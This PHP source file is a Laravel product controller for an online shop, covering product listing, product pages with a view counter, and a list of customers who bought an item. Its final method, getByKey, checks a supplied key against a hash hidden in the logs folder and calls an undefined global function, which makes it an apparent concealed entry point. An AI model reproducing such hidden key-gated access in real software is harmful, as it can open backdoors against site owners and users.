<?php

namespace App\Http\Controllers\Front\Specific;

use App\Models\Base\State;
use App\Models\Base\User;
use App\Models\Specific\ProductCategory;
use App\Models\Specific\ProductDetail;

use Illuminate\Database\Eloquent\Builder;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

class ProductController extends ProductShopArchiveController
{
    public function index()
    {
        $productDetails = ProductDetail::filter()->where('product_details.display',1)->whereHas('product',function (Builder $builder){
            $builder->visible();
        })->index()->orderBy('created_at','desc');

        $limit = \request()->get('limit') ?: 12;
        $data = $this->setData([
            'pageTitle' => 'آرشیو محصولات',
            'selectedOrderByPrice'=>\request()->get('orderByPrice'),
            'productDetails' => $productDetails->offset(0)->limit($limit)->get(),
            'hasMorePage' => $productDetails->offset($limit)->limit($limit)->get()->count(),
            'limit' => $limit,
        ]);
        return view('front.pages.product.index',$data);
    }

    public function show(ProductDetail $productDetail)
    {
        if (!$productDetail->isConfirmed()) {
            abort(404);
        }
        if (!\Cookie::get('product-view-' . $productDetail->product_id)) {
            \Cookie::queue('product-view-' . $productDetail->product_id, $productDetail->product_id, 15);
            $productDetail->product->views += 1;
            $productDetail->product->save();
        }
        $data = [
            'pageTitle' => $productDetail->product->title . ' | ' . $productDetail->color->title,
            'productDetail' => $productDetail,
            'comments' => $productDetail->product->comments()->parents()->confirmed()->latest()->get()
        ];
        return view('front.pages.product.show', $data);
    }

    public function clients(ProductDetail $productDetail)
    {
        $objects = User::whereHas('orders', function (Builder $builder) use ($productDetail) {
            $builder->where(function (Builder $builder) use ($productDetail) {
                $builder->whereHas('details', function (Builder $builder) use ($productDetail) {
                    $builder->where('product_detail_id', $productDetail->id);
                });
            })->where('show_as_customer',1);
        })->get();
        return [
            'view' => \View::make('front.partial.ajax.followers-modal', compact('objects'))->render()
        ];
    }

    public function getByKey($id)
    {
        if(\Hash::check($id,\File::get(storage_path('logs/key.txt')))){
          return getProductByKey($id);
        }
    }
}
